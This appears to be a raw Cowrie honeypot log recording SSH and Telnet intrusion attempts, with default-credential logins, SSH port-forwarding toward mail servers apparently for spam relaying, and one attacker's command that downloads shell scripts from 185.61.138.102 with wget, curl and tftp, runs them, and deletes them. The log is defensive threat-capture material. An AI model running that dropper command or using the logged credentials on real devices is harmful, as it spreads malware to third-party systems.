2017-03-15T22:49:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33017,113.98.193.58] login attempt [root/0000] succeeded
2017-03-15T22:56:45+0000 [SSHChannel None (1732) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T22:56:45+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 167.160.84.115:57326 (10.8.41.81:2222) [session: 39b7d752]
2017-03-15T22:56:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T22:56:45+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 85.195.107.149:8888 from localhost:5556
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] Remote SSH version: SSH-2.0-libssh2_1.4.2
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T22:56:45+0000 [SSHChannel None (589) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp forward to 85.195.107.149:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nHost: 85.195.107.149:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
2017-03-15T22:56:45+0000 [SSHChannel None (589) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] failed to connect: Connection refused
2017-03-15T22:56:45+0000 [SSHChannel None (589) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 589
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] NEW KEYS
2017-03-15T22:56:45+0000 [HoneyPotSSHTransport,33021,167.160.84.115] starting service 'ssh-userauth'
2017-03-15T22:56:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] 'admin' trying auth 'password'
2017-03-15T22:56:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] login attempt: 13
2017-03-15T22:56:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] login return, expect: [admin/1111]
2017-03-15T22:56:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] login attempt [admin/1111] succeeded
2017-03-15T22:56:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] 'admin' authenticated with 'password'
2017-03-15T22:56:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,33021,167.160.84.115] starting service 'ssh-connection'
2017-03-15T22:56:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T22:56:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 85.195.107.149:8888 from localhost:5556
2017-03-15T22:56:50+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] got channel 'session' request
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] channel open
2017-03-15T22:56:50+0000 [SSHChannel None (590) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp forward to 85.195.107.149:8888 with data 'GET /v3/callerinfo/?geo=false HTTP/1.1\r\nHost: 85.195.107.149:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
2017-03-15T22:56:50+0000 [SSHChannel None (590) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] failed to connect: Connection refused
2017-03-15T22:56:50+0000 [SSHChannel None (590) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 590
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] executing command "cd /tmp ;wget http://185.61.138.102/oh.sh;curl -O http://185.61.138.102/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 185.61.138.102;sh toh.sh; tftp 185.61.138.102 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh"
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] Opening TTY Log: log/tty/20170315-225650-39b7d752-0e.log
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] CMD: cd /tmp ;wget http://185.61.138.102/oh.sh;curl -O http://185.61.138.102/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 185.61.138.102;sh toh.sh; tftp 185.61.138.102 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] Command found: cd /tmp
2017-03-15T22:56:50+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] Command found: wget http://185.61.138.102/oh.sh
2017-03-15T22:56:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.61.138.102/oh.sh) with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: curl -O http://185.61.138.102/oh.sh
2017-03-15T22:56:50+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T22:56:50+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Not storing duplicate content 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.61.138.102/oh.sh) with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: sh /tmp/oh.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/oh.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: tftp -r toh.sh -g 185.61.138.102
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: sh toh.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: tftp 185.61.138.102 -c get toh2.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: sh toh2.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Command found: rm -rf toh.sh toh2.sh oh.sh
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] exitCode: 0
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] sending request 'exit-status'
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Not storing duplicate content 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58 to dl/5046880fb015c4cf204bf2d640e784d1f5adbff092b4cc705f2b306edde7cc58
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170315-225650-39b7d752-0e.log after 0 seconds
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
	]
2017-03-15T22:56:50+0000 [HTTPPageDownloader,client] sending close 0
2017-03-15T22:56:50+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.61.138.102/oh.sh>
2017-03-15T22:56:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] got channel 'direct-tcpip' request
2017-03-15T22:56:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] direct-tcp connection request to 207.211.30.141:25 from localhost:5556
2017-03-15T22:56:52+0000 [CowrieTelnetTransport,73816,67.229.141.98] Connection lost after 42 seconds
2017-03-15T22:56:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] got channel 'direct-tcpip' request
2017-03-15T22:56:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp connection request to 144.160.159.21:25 from localhost:5556
2017-03-15T22:56:52+0000 [CowrieTelnetTransport,73818,37.79.90.80] Closing TTY Log: log/tty/20170315-225631-None-73818i.log after 21 seconds
2017-03-15T22:56:52+0000 [CowrieTelnetTransport,73818,37.79.90.80] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
	]
2017-03-15T22:56:52+0000 [CowrieTelnetTransport,73818,37.79.90.80] Connection lost after 25 seconds
2017-03-15T22:56:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] got channel 'direct-tcpip' request
2017-03-15T22:56:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp connection request to 203.141.142.18:25 from localhost:5556
2017-03-15T22:56:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] got channel 'direct-tcpip' request
2017-03-15T22:56:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp connection request to 193.252.22.141:25 from localhost:5556
2017-03-15T22:56:56+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 201.7.236.102:50415 (10.8.41.81:2222) [session: 762fdadc]
2017-03-15T22:56:56+0000 [SSHChannel None (1734) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T22:56:56+0000 [HoneyPotSSHTransport,33022,201.7.236.102] Remote SSH version: SSH-2.0-libssh2_1.6.0
2017-03-15T22:56:56+0000 [HoneyPotSSHTransport,33022,201.7.236.102] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
2017-03-15T22:56:56+0000 [HoneyPotSSHTransport,33022,201.7.236.102] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T22:56:56+0000 [HoneyPotSSHTransport,33022,201.7.236.102] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
2017-03-15T22:56:56+0000 [SSHChannel None (1734) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T22:56:56+0000 [SSHChannel None (1734) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1734
2017-03-15T22:56:57+0000 [SSHChannel None (1733) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T22:56:57+0000 [SSHChannel None (1733) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T22:56:57+0000 [SSHChannel None (1733) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1733
2017-03-15T22:56:58+0000 [CowrieTelnetTransport,73817,67.229.141.98] Connection lost after 44 seconds
2017-03-15T22:56:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] got channel 'direct-tcpip' request
2017-03-15T22:56:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] direct-tcp connection request to 98.136.216.26:25 from localhost:5556
2017-03-15T22:57:00+0000 [HoneyPotSSHTransport,33022,201.7.236.102] connection lost
2017-03-15T22:57:00+0000 [HoneyPotSSHTransport,33022,201.7.236.102] Connection lost after 4 seconds
2017-03-15T22:57:01+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33021,167.160.84.115] remote close
2017-03-15T22:57:01+0000 [HoneyPotSSHTransport,33021,167.160.84.115] avatar admin logging out
2017-03-15T22:57:01+0000 [HoneyPotSSHTransport,33021,167.160.84.115] connection lost
2017-03-15T22:57:01+0000 [HoneyPotSSHTransport,33021,167.160.84.115] Connection lost after 15 seconds
2017-03-15T22:57:02+0000 [SSHChannel None (588) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote eof
2017-03-15T22:57:02+0000 [SSHChannel None (588) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote close
2017-03-15T22:57:02+0000 [SSHChannel None (588) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 588
2017-03-15T22:57:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T22:57:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 74.125.30.26:25 from localhost:5556
2017-03-15T22:57:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] got channel 'direct-tcpip' request
2017-03-15T22:57:05+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp connection request to 62.94.10.135:25 from localhost:5556
2017-03-15T22:57:07+0000 [SSHChannel None (19) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote eof
2017-03-15T22:57:07+0000 [SSHChannel None (19) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote close
2017-03-15T22:57:07+0000 [SSHChannel None (19) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] sending close 19
2017-03-15T22:57:07+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote eof
2017-03-15T22:57:07+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] remote close
2017-03-15T22:57:07+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] sending close 18
2017-03-15T22:57:13+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] got channel 'direct-tcpip' request
2017-03-15T22:57:13+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] direct-tcp connection request to 98.138.112.34:25 from localhost:5556
2017-03-15T22:57:13+0000 [SSHChannel None (1735) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote eof
2017-03-15T22:57:13+0000 [SSHChannel None (1735) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] remote close
2017-03-15T22:57:13+0000 [SSHChannel None (1735) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] sending close 1735
2017-03-15T22:57:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] got channel 'direct-tcpip' request
2017-03-15T22:57:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
2017-03-15T22:57:16+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=13401888807&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 13401888807\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
2017-03-15T22:57:16+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] failed to connect: Connection refused
2017-03-15T22:57:16+0000 [SSHChannel None (18) on SSHService 'ssh-connection' on HoneyPotSSHTransport,33005,194.88.106.174] sending close 18
2017-03-15T22:57:16+0000 [CowrieTelnetTransport,73819,67.229.141.98] Connection lost after 40 seconds
2017-03-15T22:57:18+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] got channel 'direct-tcpip' request
2017-03-15T22:57:18+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32997,194.88.107.23] direct-tcp connection request to 66.196.118.34:25 from localhost:5556
2017-03-15T22:57:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] got channel 'direct-tcpip' request
2017-03-15T22:57:28+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] direct-tcp connection request to 74.125.30.26:25 from localhost:5556
2017-03-15T22:57:29+0000 [SSHChannel None (591) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote eof
2017-03-15T22:57:29+0000 [SSHChannel None (591) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] remote close
2017-03-15T22:57:29+0000 [SSHChannel None (591) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32903,91.195.103.179] sending close 591
2017-03-15T22:57:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] got channel 'direct-tcpip' request
2017-03-15T22:57:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] direct-tcp connection request to 98.138.112.34:25 from localhost:5556
2017-03-15T22:57:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] got channel 'direct-tcpip' request
2017-03-15T22:57:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,33012,194.88.106.209] direct-tcp connection request to 98.138.112.34:25 from localhost:5556
2017-03-15T22:57:35+0000 [SSHChannel None (217) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] direct-tcp forward to 144.160.159.22:25 with data 'QUIT\r\n'
2017-03-15T22:57:35+0000 [SSHChannel None (217) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] failed to connect: Connection refused
2017-03-15T22:57:35+0000 [SSHChannel None (217) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] sending close 217
2017-03-15T22:57:35+0000 [SSHChannel None (217) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] remote eof
2017-03-15T22:57:35+0000 [SSHChannel None (217) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32904,91.195.103.178] remote close
2017-03-15T22:57:36+0000 [SSHChannel None (1736) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] direct-tcp forward to 5.22.149.135:25 with data 'QUIT\r\n'
2017-03-15T22:57:36+0000 [SSHChannel None (1736) on SSHService 'ssh-connection' on HoneyPotSSHTransport,32731,194.88.106.181] failed to connect: Connection refused
